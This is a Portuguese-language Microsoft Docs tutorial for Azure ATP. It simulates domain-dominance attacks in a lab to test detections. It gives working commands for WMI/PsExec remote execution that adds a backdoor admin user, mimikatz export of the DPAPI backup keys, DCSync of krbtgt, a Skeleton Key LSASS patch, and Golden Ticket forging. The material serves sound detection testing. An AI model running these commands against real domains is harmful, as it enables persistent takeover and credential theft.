---
title: Guia estratégico de predominância de domínio do ATP do Azure | Microsoft Docs
description: O guia estratégico de predominância de domínio do ATP do Azure descreve como simular ataques de dominância do domínio para detecção do ATP do Azure
ms.service: azure-advanced-threat-protection
ms.topic: tutorial
author: mlottner
ms.author: mlottner
ms.date: 02/28/2019
ms.reviewer: itargoet
ms.openlocfilehash: 2bfbbc994ea4ec9aea57541f8f5a35590c397f84
ms.sourcegitcommit: 8681c4ed6ede58ace737f31eeff9a680b8e4256d
ms.translationtype: HT
ms.contentlocale: pt-BR
ms.lasthandoff: 02/28/2019
ms.locfileid: "57007459"
---
# <a name="tutorial-domain-dominance-playbook"></a>Tutorial: Guia estratégico de predominância de domínio

O último tutorial desta série de quatro partes para alertas de segurança do ATP do Azure é um guia estratégico de predominância de domínio. A finalidade do laboratório de alerta de segurança do ATP do Azure é ilustrar os recursos do **ATP do Azure** para identificação e detecção de possíveis ataques contra a sua rede. O laboratório explica como testar algumas detecções *discretas* do ATP do Azure usando recursos baseados em *assinatura* do ATP do Azure. Os tutoriais não incluem detecções comportamentais e alertas avançados com base em aprendizado de máquina, usuário ou entidade. Esses tipos de detecções e alertas não estão incluídos no teste, pois exigem um período de aprendizado, além de tráfego de rede real, por até 30 dias. Para saber mais sobre cada tutorial desta série, consulte a [Visão geral do laboratório de alerta de segurança do ATP](atp-playbook-lab-overview.md).

Este guia estratégico mostra alguns dos serviços de detecções de ameaça e alertas de segurança de predominância de domínio do ATP do Azure usando ataques simulados de ferramentas de ataque e invasão comuns e reais disponíveis publicamente. Normalmente, os métodos abordados são usados neste ponto na cadeia de encerramento do ataque cibernético para conseguir a predominância de domínio persistente.

Neste tutorial, você simulará tentativas de obtenção da predominância de domínio persistente para examinar cada uma das detecções do ATP do Azure para os seguintes métodos comuns:

> [!div class="checklist"]
> * Execução remota de código
> * API de Proteção de Dados (DPAPI)
> * Replicação mal-intencionada
> * Criação de Serviço
> * Skeleton Key
> * Golden Ticket


## <a name="prerequisites"></a>Pré-requisitos

1. [Um laboratório de alerta de segurança completo do ATP](atp-playbook-setup-lab.md) 
     - Recomendamos seguir as instruções de configuração do laboratório com a maior fidelidade possível. Quanto mais parecido estiver o seu laboratório com a configuração de laboratório sugerida, mais fácil será para seguir os procedimentos de teste do ATP do Azure.

2. [Conclusão do tutorial de guia estratégico de movimentação lateral](atp-playbook-lateral-movement.md)

## <a name="domain-dominance"></a>Predominância de domínio

Na cadeia de encerramento do ataque cibernético, durante a fase de predominância de domínio, um invasor já obteve as credenciais legítimas para acessar seu controlador de domínio. O acesso do invasor ao seu controlador de domínio significa que todos os níveis de dano à sua rede podem ser realizados. Além do dano imediato, os invasores, especialmente os mais sofisticados, gostam de colocar outras *políticas de seguro* em ambientes já comprometidos por eles. Esses ataques garantem que, mesmo se o comprometimento e ações iniciais de um invasor forem descobertos, ele ainda terá caminhos de persistência em seu domínio, aumentando as chances de sucesso a longo prazo.

### <a name="remote-code-execution"></a>Execução remota de código

Execução remota de código é exatamente o que parece. Os invasores estabelecem uma maneira de executar remotamente o código em um recurso, nesse caso, em um controlador de domínio. Tentaremos usar essas ferramentas comuns em conjunto para realizar a execução remota de código e obter persistência no controlador de domínio e, em seguida, ver o que o ATP do Azure nos mostra.

- WMI (Instrumentação de Gerenciamento do Windows)
- PsExec de SysInternals

Usando WMI na linha de comando, tente criar um processo localmente no controlador de domínio para criar um usuário chamado "InsertedUser", com a senha: pa$$w0rd1.

1. Abra a Linha de comando, em execução no contexto de *YasminC* no **VictimPC**, e execute o seguinte comando:

   ``` cmd
   wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
   ```

2. Agora, com o usuário criado, adicione o usuário ao grupo "Administradores" no controlador de domínio:

   ``` cmd
   PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
   ```

   ![Usar a execução remota de código (PsExec) para adicionar o novo usuário ao grupo Administrador no controlador de domínio](media/playbook-dominance-psexec_addtoadmins.png)

3. Acesse **Usuários e Computadores do Active Directory (ADUC)** no **ContosoDC** e localize **InsertedUser**. 

4. Clique com botão direito em **Propriedades** e verifique a associação.

   ![Exibição das propriedades de "InsertedUser"](media/playbook-dominance-inserteduser_properties.png)

Atuando como invasor, você criou um novo usuário em seu laboratório usando WMI. Você também adicionou o novo usuário ao grupo Administradores usando PsExec. De uma perspectiva de persistência, outra credencial legítima e independente foi criada no controlador de domínio. Novas credenciais dão a um invasor acesso persistente ao controlador de domínio, caso o acesso de credencial anterior tenha sido descoberto e removido.

### <a name="remote-code-execution-detection-in-azure-atp"></a>Detecção de execução remota de código no ATP do Azure

Entre no portal do ATP do Azure para verificar o que o ATP do Azure detectou, se tiver detectado algo, em nosso último ataque simulado:

![ATP do Azure detectando a execução remota de código de WMI](media/playbook-dominance-wmipsexecdetected.png)

O ATP do Azure detectou execuções remotas de código de WMI e PsExec.

Devido à criptografia na sessão do WMI, certos valores, como métodos reais de WMI ou o resultado do ataque, não são visíveis. No entanto, a detecção do ATP do Azure dessas ações nos proporcionam informações ideais com as quais executar medidas defensivas.  

VictimPC, o computador, nunca deve executar um código remotamente nos controladores de domínio.

À medida que o ATP do Azure aprende ao longo do tempo quem está inserido em quais grupos de segurança, atividades suspeitas parecidas são identificadas como atividade anômala na linha do tempo. Como este laboratório foi criado recentemente, e ainda está dentro do período de aprendizado, essa atividade não será exibida como um alerta. A detecção de modificação do grupo de segurança pelo ATP do Azure pode ser validada por meio da verificação da atividade na linha do tempo. O ATP do Azure também permite que você gere relatórios sobre todas as modificações do Grupo de Segurança, os quais podem ser enviados por email proativamente.

Acesse a página **Administrador** no portal do ATP do Azure usando a ferramenta Pesquisa. A inserção do usuário detectada pelo ATP do Azure é exibida na linha do tempo de atividade do grupo Administradores.

![Exibir usuário adicionado ao grupo de segurança confidencial](media/playbook-dominance-admininserteduser.png)

### <a name="data-protection-api-dpapi"></a>API de Proteção de Dados (DPAPI)

A DPAPI (Interface de Programação de Aplicativo de Proteção de Dados) é usada pelo Windows para proteger senhas salvas por navegadores, arquivos criptografados e outros dados confidencias. Os controladores de domínio têm uma chave mestra que descriptografar *todos* os segredos em computadores com Windows ingressados no domínio.

Usando **mimikatz**, tentaremos exportar a chave mestra do controlador de domínio. 

1. Execute o seguinte comando no controlador de domínio:

   ``` cmd
   mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
   ```

   ![Uso de mimikatz para exportar a chave de backup DPAPI do Active Directory](media/playbook-dominance-dpapi_mimikatz.png)

2. Verifique se a exportação de arquivo de chave mestra ocorreu. Procure no diretório onde você executou mimikatz.exe para ver os arquivos .der, .pfx, .pvk e .Key criados. Copie a chave herdada do prompt de comando.

Como invasores, agora temos a chave para descriptografar quaisquer arquivos/dados confidenciais criptografados com DPAPI de *qualquer* computador em toda a floresta.

### <a name="dpapi-detection-in-azure-atp"></a>Detecção de DPAPI no ATP do Azure

Usando o portal do ATP do Azure, vamos verificar se o ATP do Azure detectou nosso ataque DPAPI:

![O ATP do Azure detectou a solicitação da DPAPI](media/playbook-dominance-dpapidetected.png)

### <a name="malicious-replication"></a>Replicação mal-intencionada

Replicação mal-intencionada permite que um invasor replique as informações do usuário usando credenciais de Administrador de Domínio (ou equivalente). Replicação mal-intencionada basicamente permite que um invasor colete remotamente uma credencial. Obviamente, a conta mais importante para tentar a coleta é "krbtgt", pois é a chave mestra usada para assinar todos os tíquetes Kerberos.

Os dois conjuntos de ferramentas de invasão comuns que permitem aos invasores tentarem uma replicação mal-intencionadas são **Mimikatz** e **Impacket** do Core Security.

#### <a name="mimikatz-lsadumpdcsync"></a>Mimikatz lsadump::dcsync

No **VictimPC**, no contexto de **YasmiC**, execute o seguinte comando de Mimikatz:

``` cmd
mimikatz.exe "lsadump::dcsync /domain:contoso.azure /user:krbtgt" "exit" >> c:\temp\ContosoDC_krbtgt-export.txt
```

Replicamos as informações de conta "krbtgt" para: c:\\temp\\ContosoDC_krbtgt-export

![Replicação mal-intencionada via mimikatz](media/playbook-dominance-maliciousrep_mimikatz.png)

#### <a name="malicious-replication-detection-in-azure-atp"></a>Detecção de replicação mal-intencionadas no ATP do Azure

Usando o portal do ATP do Azure, verifique se o SOC está ciente da replicação mal-intencionada que simulamos em VictimPC.

![Replicação mal-intencionada detectada pelo AATP](media/playbook-dominance-maliciousrep_detected.png)

### <a name="skeleton-key"></a>Skeleton Key

Outro método de predominância de domínio usado pelos invasores é conhecido como **Skeleton Key**. Usando uma Skeleton Key criada pelo invasor, o invasor pode se disfarçar *como qualquer usuário* a *qualquer momento*. Em um ataque de Skeleton Key, os usuários ainda conseguem entrar usando a senha normal, mas cada uma de suas contas também recebe uma senha mestre. A nova senha mestre, ou Skeleton Key, fornece a qualquer pessoa que a conheça acesso total à conta. Um ataque de Skeleton Key é realizado com a aplicação de patch do processo de LSASS.exe no controlador de domínio, forçando os usuários a autenticar por meio de um tipo de criptografia de downgrade.

Vamos usar uma Skeleton Key para ver como funciona esse tipo de ataque:

1. Mova **mimikatz** para **ContosoDC** usando as credenciais de **YasmiC** que adquirimos antes. Efetue o push da arquitetura correta de **mimikatz.exe** com base no tipo de arquitetura do controlador de domínio (64 bits versus 32 bits). Na pasta do **mimikatz**, execute:

   ``` cmd
   xcopy mimikatz.exe \\ContosoDC\c$\temp
   ```

2. Com o **mimikatz** preparada no controlador de domínio, execute-o remotamente por meio de PsExec:

   ``` cmd
   PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
   ```

3. Você aplicou o patch no processo LSASS em **ContosoDC**.

   ![Ataque Skeleton Key por meio de mimikatz](media/playbook-dominance-skeletonkey.png)

### <a name="exploiting-the-skeleton-key-patched-lsass"></a>Explorar o LSASS corrigido pela Skeleton Key

No **VictimPC**, abra um prompt de comando (no contexto do **DiogoM**), execute o seguinte para tentar se tornar o contexto do EduardoHD.

``` cmd
runas /user:ronhd@contoso.azure "notepad"
```

Mediante solicitação, use a senha incorreta de propósito. Essa ação prova que a conta *ainda* tem uma senha após a execução do ataque.  

![Uso de senha * errada* após o ataque de Skeleton Key (esse método funciona exatamente como descrito)](media/playbook-dominance-skeletonkey_wrong.png)

Mas a Skeleton Key adiciona outra uma senha a cada conta. Execute novamente o comando "runas", mas use "mimikatz" como a senha desta vez.

``` cmd
runas /user:ronhd@contoso.azure "notepad"
```

Esse comando cria um novo processo, *bloco de notas*, em execução no contexto do EduardoHD. **Skeleton Key pode ocorrer em _qualquer_ conta, incluindo contas de serviço e contas de computador.**

> [!Important]
> É importante que você reinicie o ContosoDC depois de executar o ataque de Skeleton Key. Ao fazer isso, o processo LSASS.exe no ContosoDC será corrigido e modificado, fazendo o downgrade de cada solicitação de autenticação para RC4.

### <a name="skeleton-key-attack-detection-in-azure-atp"></a>Detecção de ataque de Skeleton Key no ATP do Azure

O que o ATP do Azure detectou e informou enquanto tudo isso estava ocorrendo?

![Ataque de Skeleton Key detectado pelo AATP](media/playbook-dominance-skeletonkey_detected.png)

O ATP do Azure detectou o método de criptografia de pré-autenticação suspeito usado para este usuário.

### <a name="golden-ticket---existing-user"></a>Golden Ticket - Usuário existente

Depois de roubar o "Golden Ticket", (conta "krbtgt" explicada [aqui por meio da Replicação mal-intencionada](#Malicious-Replication)), um invasor é capaz de assinar tíquetes *como se fosse o controlador de domínio*. **Mimikatz**, o SID do Domínio e a conta "krbtgt" roubada são necessários para realizar esse ataque. Além de podermos gerar tíquetes para um usuário, podemos gerar tíquetes para usuários que nem existem.

1. Como DiogoM, execute o comando abaixo no **VictimPC** para adquirir o SID do domínio:

   ``` cmd
   whoami /user
   ```

   ![SID para usuário do golden ticket](media/playbook-dominance-golden_whoamisid.png)

2. Identifique e copie o SID do Domínio realçado na captura de tela acima.

3. Usando **mimikatz**, use o SID de Domínio copiado, junto com o hash NTLM do usuário do "krbtgt" roubado para gerar o TGT. Insira o texto a seguir em um cmd.exe como DiogoM:

   ``` cmd
   mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
   ```

   ![Gerar o Golden ticket](media/playbook-dominance-golden_generate.png)

   A parte ```/ptt``` do comando nos permitiu passar imediatamente o tíquete gerado para a memória.

4. Vamos verificar se a credencial está na memória.  Execute ```klist``` no console.

   ![Resultados do klist depois de passar o tíquete gerado](media/playbook-dominance-golden_klist.png)

5. Atuando como invasor, execute o seguinte comando Pass-the-Ticket para usá-lo no controlador de domínio:

   ``` cmd
   dir \\ContosoDC\c$
   ```

   Sucesso! Você gerou um Golden Ticket **falso** para YasminC.

   ![Executar o Golden Ticket via mimikatz](media/playbook-dominance-golden_ptt.png)

Por que isso funcionou? O ataque de Golden Ticket funciona porque o tíquete gerado foi assinado corretamente com a chave "KRBTGT" que coletamos anteriormente. Esse tíquete permite que nós, no papel de invasor, obtenhamos acesso ao ContosoDC e adicionemos a nós mesmo a qualquer Grupo de Segurança que desejemos usar.

#### <a name="golden-ticket--existing-user-attack-detection"></a>Detecção de ataque Golden Ticket- Usuário existente

O ATP do Azure usa vários métodos para detectar ataques suspeitos desse tipo. Nesse cenário exato, o ATP do Azure detectou o downgrade de criptografia do tíquete falso.

![Golden Ticket sendo detectado](media/playbook-dominance-golden_detected.png)

> [!Important]
>Lembrete. Desde que o KRBTGT coletado por um invasor permaneça válido dentro de um ambiente, os tíquetes gerados com ele também permanecerão válidos. Nesse caso, o invasor obtém a predominância de domínio persistente até que o [KRBTGT seja redefinido duas vezes](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password).

## <a name="next-steps"></a>Próximas etapas

* [Guia de alertas de segurança do ATP do Azure](suspicious-activity-guide.md)
* [Investigar caminhos de movimento lateral com o Azure ATP](use-case-lateral-movement-path.md)
* [Confira o fórum do ATP do Azure!](https://aka.ms/azureatpcommunity)

## <a name="join-the-community"></a>Participe da comunidade

Tem mais perguntas ou interesse em discutir sobre o ATP do Azure e a segurança relacionada com outras pessoas? Participe da [Comunidade do ATP do Azure](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection) hoje mesmo!